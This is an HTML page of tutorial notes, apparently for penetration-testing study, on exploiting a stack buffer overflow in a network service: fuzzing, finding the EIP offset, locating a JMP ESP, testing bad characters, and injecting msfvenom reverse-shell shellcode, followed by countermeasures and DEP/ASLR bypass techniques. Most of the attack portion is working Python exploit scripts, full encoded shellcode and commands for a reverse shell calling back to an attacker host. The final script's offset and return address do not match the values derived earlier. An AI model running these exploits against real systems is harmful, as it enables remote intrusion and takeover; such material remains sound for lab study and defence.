
<!DOCTYPE html>
<html>
    <head>
        <title>Buffers overflow</title>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <link rel="stylesheet" type="text/css" href="/assets/main.css">
        <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
    </head>
   
    <body>
        <fieldset class='box'>
            <legend>Buffers overflow ToC</legend>
                <ul>
                    <li><span><a href='#Identification'>Identification</a></span></li>
                    <li><span><a href='#Finding EIP'>Finding EIP</a></span></li>
                    <li><span><a href='#Finding a JMP ESP'>Finding a JMP ESP</a></span></li>
                    <li><span><a href='#Finding bad characters'>Finding bad characters</a></span></li>
                    <li><span><a href='#Injecting a shellcode'>Injecting a shellcode</a></span></li>
                    <li><span><a href='#MsfPayloads'>MsfPayloads</a></span></li>
                    <li><span><a href='#Countermeasures'>Countermeasures</a></span></li>
                </ul>
        </fieldset>
        <fieldset class='box'>
            <a name='Identification'></a>
            <legend>Identification</legend>
                <ul>
                    <li><span>First step is to identify the vulnerability. You can debug the app and fuzz it with larger strings and identify the approximate length that causes the crash. We can script it as follows:</span></li>
                <pre><code>import socket

# Create an array of buffers, from 10 to 2000, with increments of 20.
counter = 100
fuzz_strings = ["A"]

while len(fuzz_strings) &lt;= 30:
    fuzz_strings.append("A" * counter)
    counter = counter + 200

for fuzz in fuzz_strings:
    print "Fuzzing with %s bytes" % len(fuzz)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(('192.168.0.9', 80))
    s.send('GET ' + fuzz + '\r\n\r\n' )
    print s.recv(1024)
    s.close()</code></pre>
                    <li><span>We run the script and find that the app crashes when sending a string <strong>2700</strong> long, so we know that the buffer is somewhere between <strong>2500</strong> and <strong>2700</strong>.</span></li>
                </ul>
        </fieldset>
        <fieldset class='box'>
            <a name='Finding EIP'></a>
            <legend>Finding EIP</legend>
                <ul>
                    <li><span>Second step is to find the exact size of the buffer before the EIP register. We can achieve this by generating a string with unique sequence of characters and use the debugger to find the value that overwrites the EIP register. We create the string as follows:</span></li>
                <pre><code>$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700</code></pre>
                    <li><span>We add the string to our script:</span></li>
                <pre><code>import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer='STRING'
try:
    print "\nSending evil buffer..."
    s.connect(('192.168.0.9', 80))
    s.send('GET ' + buffer + '\r\n\r\n')
    print s.recv(1024)
    print "\nDone!."
except:
    print "Could not connect"</code></pre>
                    <li><span>Send the payload and find the value of EIP, and find the exact length needed with:</span></li>
                <pre><code>$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l STRING_LENGTH(2700) -q EIP_VALUE(37694236)

[*] Exact match at offset 2606</code></pre>
                    <li><span>We know that the buffer size before the EIP is 2606.</span></li>
                </ul>
        </fieldset>
        <fieldset class='box'>
            <a name='Finding a JMP ESP'></a>
            <legend>Finding a JMP ESP</legend>
                <ul>
                    <li><span>Our objective is to inject a shellcode in beginning of the stack, replace the <strong>EIP</strong> with the address of the <strong>ESP</strong> and get the execution flow redirected to our shellcode. The problem is that the amount of data loaded in the stack changes at every execution, so we can not predict the value of the ESP address. We can work around this by finding a JMP ESP instruction in memory from a module that has no <strong>DES</strong> or <strong>ASLR</strong>, and change our EIP to point to that address.</span></li>
                    <li><span>To find the modules that don't have ASLR and DES, you can run within the ImmunityDebugger:</span></li>
                <pre><code>!mona modules</code></pre>
                    <li><span>Now, you can see how the asm <strong>JMP_ESP</strong> looks like in machine code by running:</span></li>
                <pre><code># /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm &gt; jmp esp
    00000000 FFE4 jmp esp
nasm &gt;</code></pre>
                    <li><span>Now you can find <strong>FFE4</strong> with:</span></li>
                <pre><code>!mona find -s '\xff\xe4' -m module.dll</code></pre>
                    <li><span>It will find some addrs such as <strong>0x5f4a358f</strong>, since x86 is little endian, to have it properly read from the stack we need to encode it as <strong> \x8f\x35\x4a\x5f</strong>.</span></li>
                    <li><span>We will add our shellcode after the EIP JMP instruction (of about 400 bytes), so our payload will look like:</span></li>
                <pre><code>Padding + JMP ESP + shellcode</code></pre>
                    <li><span>Using the previous buffer size and address:</span></li>
                <pre><code>'A' * 2606 + \x8f\x35\x4a\x5f + 'C' * 400</code></pre>
                    <li><span>So, the new exploit looks like this:</span></li>
                <pre><code>import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer = 'A' * 2606 + \x8f\x35\x4a\x5f + 'C' * 400
try:
    print "\nSending evil buffer..."
    s.connect(('192.168.0.9', 80))
    s.send('GET ' + buffer + '\r\n\r\n')
    print s.recv(1024)
    print "\nDone!."
except:
    print "Could not connect"</code></pre>
                    <li><span>We will set a breakpoint to that memory location <strong>5f4a358f</strong> and run the new exploit. We go to CPU view, right click, go to, expression and the address. Press F2 in ImmunityDebugger to set the breakpoint, the debugger should pause when sending the payload, and stepping into the next instruction (F7) should jump to a the top of the stack, where there should be 400 C. If there are less 'C', then the input has been truncated and you will probably need a bigger buffer to fit your shellcode.</span></li>
                </ul>
        </fieldset>
        <fieldset class='box'>
            <a name='Finding bad characters'></a>
            <legend>Finding bad characters</legend>
                <ul>
                    <li><span>Next step is to generate a shellcode. Before doing that, we need to know what characters the application allows. We will send a buffer that contains all the ASCII characters:</span></li>
                <pre><code>import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
buffer = "A" * 2606 + "B" * 4 + badchars
try:
    print "\nSending evil buffer..."
    s.connect(('192.168.0.10', 110))
    s.send('GET ' + buffer + '\r\n\r\n')
    print s.recv(1024)
    s.close()
    print "\nDone!"
except:
    print "Could not connect"</code></pre>
                    <li><span>We run it, right click in the ESP address, and follow in dump to find potential bad characters that the application truncates. We should see the full ASCII character space. Some characters are more likely to be truncated (i.e. <strong>0x00</strong> as it is the end of string delimiter in C. In Pop3, new line char <strong>0xA</strong> as it is the command separator, etc..).</span></li>
                    <li><span>So we know how much padding we need to add to the stack to overwrite the EIP, we know an address that will get the execution flow redirected to the start of the stack, we just need to create a shellcode.</span></li>
                </ul>
        </fieldset>
        <fieldset class='box'>
            <a name='Injecting a shellcode'></a>
            <legend>Injecting a shellcode</legend>
                <ul>
                    <li><span>First step, is to generate the shellcode. You can list all available payloads in metasploit:</span></li>
                <pre><code>$ msfpayload -l</code></pre>
                    <li><span>Generate a reverse shell shellcode.</span></li>
                <pre><code>$ msfpayload windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=443  -f c</code></pre>
                    <li><span>The payload will contain illegal characters, you can filter those out using *msfencode*:</span></li>
                <pre><code>$ msfpayload windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=443 R | msfencode -b "\x00\x0a\x0d"</code></pre>
                    <li><span>Generic windows reverse shell:</span></li>
                <pre><code>$ msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f  c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"</code></pre>
                    <li><span>In the end, you are going to have a shellcode as the following one:</span></li>
                <pre><code>root@kali:~/oscp/bo_miniserver# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.4 LPORT=443 -f  c -e x86/shikata_ga_nai -b "\x00\x0d"
Final size of c file: 1500 bytes
unsigned char buf[] =
"\xbf\x09\x50\xa4\x04\xdb\xd3\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x31\x7e\x12\x83\xc6\x04\x03\x77\x5e\x46\xf1\x7b\xb6\x04"
"\xfa\x83\x47\x69\x72\x66\x76\xa9\xe0\xe3\x29\x19\x62\xa1\xc5"
"\xd2\x26\x51\x5d\x96\xee\x56\xd6\x1d\xc9\x59\xe7\x0e\x29\xf8"
"\x6b\x4d\x7e\xda\x52\x9e\x73\x1b\x92\xc3\x7e\x49\x4b\x8f\x2d"
"\x7d\xf8\xc5\xed\xf6\xb2\xc8\x75\xeb\x03\xea\x54\xba\x18\xb5"
"\x76\x3d\xcc\xcd\x3e\x25\x11\xeb\x89\xde\xe1\x87\x0b\x36\x38"
"\x67\xa7\x77\xf4\x9a\xb9\xb0\x33\x45\xcc\xc8\x47\xf8\xd7\x0f"
"\x35\x26\x5d\x8b\x9d\xad\xc5\x77\x1f\x61\x93\xfc\x13\xce\xd7"
"\x5a\x30\xd1\x34\xd1\x4c\x5a\xbb\x35\xc5\x18\x98\x91\x8d\xfb"
"\x81\x80\x6b\xad\xbe\xd2\xd3\x12\x1b\x99\xfe\x47\x16\xc0\x96"
"\xa4\x1b\xfa\x66\xa3\x2c\x89\x54\x6c\x87\x05\xd5\xe5\x01\xd2"
"\x1a\xdc\xf6\x4c\xe5\xdf\x06\x45\x22\x8b\x56\xfd\x83\xb4\x3c"
"\xfd\x2c\x61\x92\xad\x82\xda\x53\x1d\x63\x8b\x3b\x77\x6c\xf4"
"\x5c\x78\xa6\x9d\xf7\x83\x21\x62\xaf\x8b\xb5\x0a\xb2\x8b\xb4"
"\x71\x3b\x6d\xdc\x95\x6a\x26\x49\x0f\x37\xbc\xe8\xd0\xed\xb9"
"\x2b\x5a\x02\x3e\xe5\xab\x6f\x2c\x92\x5b\x3a\x0e\x35\x63\x90"
"\x26\xd9\xf6\x7f\xb6\x94\xea\xd7\xe1\xf1\xdd\x21\x67\xec\x44"
"\x98\x95\xed\x11\xe3\x1d\x2a\xe2\xea\x9c\xbf\x5e\xc9\x8e\x79"
"\x5e\x55\xfa\xd5\x09\x03\x54\x90\xe3\xe5\x0e\x4a\x5f\xac\xc6"
"\x0b\x93\x6f\x90\x13\xfe\x19\x7c\xa5\x57\x5c\x83\x0a\x30\x68"
"\xfc\x76\xa0\x97\xd7\x32\xd0\xdd\x75\x12\x79\xb8\xec\x26\xe4"
"\x3b\xdb\x65\x11\xb8\xe9\x15\xe6\xa0\x98\x10\xa2\x66\x71\x69"
"\xbb\x02\x75\xde\xbc\x06";</code></pre>
                    <li><span>The shellcode needs to be decoded in memory, which means we need extra space in the stack. We can achieve this by adding some NOPs before the shellcode, so our buffer looks like this:</span></li>
                <pre><code>"A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode</code></pre>
                    <li><span>We add the shellcode to the previous Poc:</span></li>
                <pre><code>import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
shellcode = (
"\xbf\x09\x50\xa4\x04\xdb\xd3\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x31\x7e\x12\x83\xc6\x04\x03\x77\x5e\x46\xf1\x7b\xb6\x04"
"\xfa\x83\x47\x69\x72\x66\x76\xa9\xe0\xe3\x29\x19\x62\xa1\xc5"
"\xd2\x26\x51\x5d\x96\xee\x56\xd6\x1d\xc9\x59\xe7\x0e\x29\xf8"
"\x6b\x4d\x7e\xda\x52\x9e\x73\x1b\x92\xc3\x7e\x49\x4b\x8f\x2d"
"\x7d\xf8\xc5\xed\xf6\xb2\xc8\x75\xeb\x03\xea\x54\xba\x18\xb5"
"\x76\x3d\xcc\xcd\x3e\x25\x11\xeb\x89\xde\xe1\x87\x0b\x36\x38"
"\x67\xa7\x77\xf4\x9a\xb9\xb0\x33\x45\xcc\xc8\x47\xf8\xd7\x0f"
"\x35\x26\x5d\x8b\x9d\xad\xc5\x77\x1f\x61\x93\xfc\x13\xce\xd7"
"\x5a\x30\xd1\x34\xd1\x4c\x5a\xbb\x35\xc5\x18\x98\x91\x8d\xfb"
"\x81\x80\x6b\xad\xbe\xd2\xd3\x12\x1b\x99\xfe\x47\x16\xc0\x96"
"\xa4\x1b\xfa\x66\xa3\x2c\x89\x54\x6c\x87\x05\xd5\xe5\x01\xd2"
"\x1a\xdc\xf6\x4c\xe5\xdf\x06\x45\x22\x8b\x56\xfd\x83\xb4\x3c"
"\xfd\x2c\x61\x92\xad\x82\xda\x53\x1d\x63\x8b\x3b\x77\x6c\xf4"

"\x5c\x78\xa6\x9d\xf7\x83\x21\x62\xaf\x8b\xb5\x0a\xb2\x8b\xb4"
"\x71\x3b\x6d\xdc\x95\x6a\x26\x49\x0f\x37\xbc\xe8\xd0\xed\xb9"
"\x2b\x5a\x02\x3e\xe5\xab\x6f\x2c\x92\x5b\x3a\x0e\x35\x63\x90"
"\x26\xd9\xf6\x7f\xb6\x94\xea\xd7\xe1\xf1\xdd\x21\x67\xec\x44"
"\x98\x95\xed\x11\xe3\x1d\x2a\xe2\xea\x9c\xbf\x5e\xc9\x8e\x79"
"\x5e\x55\xfa\xd5\x09\x03\x54\x90\xe3\xe5\x0e\x4a\x5f\xac\xc6"
"\x0b\x93\x6f\x90\x13\xfe\x19\x7c\xa5\x57\x5c\x83\x0a\x30\x68"
"\xfc\x76\xa0\x97\xd7\x32\xd0\xdd\x75\x12\x79\xb8\xec\x26\xe4"
"\x3b\xdb\x65\x11\xb8\xe9\x15\xe6\xa0\x98\x10\xa2\x66\x71\x69"
"\xbb\x02\x75\xde\xbc\x06"
)
buffer = "A" * 1787 + "\x7E\x6E\xEF\x77" + "\x90" * 8 + shellcode
try:
    print "\nSending evil buffer..."
    s.connect(('192.168.0.9', 80))
    s.send('GET ' + buffer + '\r\n\r\n')
    print s.recv(1024)
    print "\nDone!."
except:
    print "Could not connect"</code></pre>
                    <li><span>We run:</span></li>
                <pre><code>$ nc -lvp 443</code></pre>
                    <li><span>We should get a reverse shell, we can debug the previous memory address to identify potential problems.</span></li>
                </ul>
        </fieldset>
        <fieldset class='box'>
            <a name='MsfPayloads'></a>
            <legend>MsfPayloads</legend>
                <ul>
                    <li><span>staged payload is send in two parts to the victim. The first part is a small primary payload that do that the victim machine connect to the attacker machine and later the attack machine sends the second part of the payload. It is useful when the buffer has not a big length. (eg. linux/x64/shell/reverse_tcp)</span></li>
                    <li><span>Non-staged (linux/x64/shell_reverse_tcp), larger but full shell.</span></li>
                </ul>
        </fieldset>
        <fieldset class='box'>
            <a name='Countermeasures'></a>
            <legend>Countermeasures</legend>
                <ul>
                    <li><span><strong>Code signing</strong> executable page of memory is signed, and instructions executed only if the signature is correct.</span></li>
                    <li><span><strong>SEHOP</strong> checks the validity of a thread’s exception handler list before allowing any to be called.</span></li>
                    <li><span><strong>Pointer encoding</strong> Function pointers can be encoded (using XOR or other means) within Microsoft Visual Studio and GCC. If encoded pointers are overwritten without applying the correct XOR operation first, they cause a program crash.</span></li>
                    <li><span><strong>Stack canaries</strong> Compilers including Microsoft Visual Studio, GCC, and LLVM Clang place canaries on the stack before important values (e.g., saved eip and function pointers on the stack). The value of the canary is checked before the function returns; if it has been modified, the program crashes.</span></li>
                    <li><span><strong>Heap protection</strong> Sanity checking within heap management code. These improvements protect against double free and heap overflows resulting in control structures being overwritten.</span></li>
                    <li><span><strong>Relocation read-only (RELRO)</strong> The GOT, destructors, and constructors entries within the data segment can be protected through instructing the GCC linker to resolve all dynamically linked functions at runtime, and marking the entries read-only.</span></li>
                    <li><span><strong>Format string protection</strong> Most compilers provide protection against format string attacks.</span></li>
                    <li><span><strong>Data execution prevention (DEP)</strong> is used to mark writable areas of memory, including the stack and the heap, as non-executable. CPU can set a bit NX (no-excutable) to portions of the stack.</span></li>
                    <li><span><strong>Address space layout randomization (ASLR)</strong> makes it difficult for an attacker to commandeer logical program flow; however, implementation flaws exist, and some libraries are compiled without ASLR support.</span></li>
                    <li><span><strong>Bypassing DEP</strong> DEP prevents the execution of arbitrary instructions from writable areas of memory. As such, you must identify and borrow useful instructions from the executable text segment to achieve your goals. The challenge is one of identifying sequences of useful instructions that can be used to form return-oriented programming (ROP) chains. It involves looking for snippets of code called ROP gatgets within the legitimate modules of the application that execute some interesting instructions and return the execution flow. For example, if the first task of the exploit is to pop EAX we will look for a pop eax; ret in the module and we will replace EIP with its address. We can chain multiple gadgets to write an exploit. The goal is to find a memory protection API such as VirtualProtect and mark the stack as executable and then the JMP ESP. The gadgets need to be in a module that does not support ASLR and DEP.</span></li>
                    <li><span>In order to prevent this, ASLR was developed. ASLR randomizes at runtime/boot time the addresses of the structures and modules to make it difficult to guess the location of ROP gadgets.</span></li>
                    <li><span>There are a few ways to <strong>bypass ASLR</strong>:</span></li>
                    <li><span><strong>Direct RET overwrite</strong>: Often processes with ASLR will still load non-ASLR modules, allowing you to just run your shellcode via a jmp esp.</span></li>
                    <li><span><strong>Partial EIP overwrite</strong>: Only overwrite part of EIP, or use a reliable information disclosure in the stack to find what the real EIP should be, then use it to calculate your target. We still need a non-ASLR module for this though.</span></li>
                    <li><span><strong>NOP spray</strong>: Create a big block of NOPs to increase chance of jump landing on legit memory. Difficult, but possible even when all modules are ASLR-enabled. Won't work if DEP is switched on though.</span></li>
                    <li><span><strong>Bruteforce</strong>: If you can try an exploit with a vulnerability that doesn't make the program crash, you can bruteforce 256 different target addresses until it works.</span></li>
                    <li><span><strong>Structured Exception Handling (SEH)</strong> Is the normal exception handling (try/catch blocks). Up to windows XP the handlers used to be registered in the stack and an attacker could overwrite them.</span></li>
                </ul>
        </fieldset>

</html>
